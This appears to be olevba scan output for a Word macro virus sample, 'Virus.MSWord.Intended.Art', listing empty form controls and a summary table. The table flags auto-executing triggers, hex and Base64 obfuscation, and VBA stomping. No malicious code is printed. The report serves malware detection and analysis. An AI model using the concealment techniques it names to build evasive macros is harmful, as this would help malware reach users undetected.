+VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
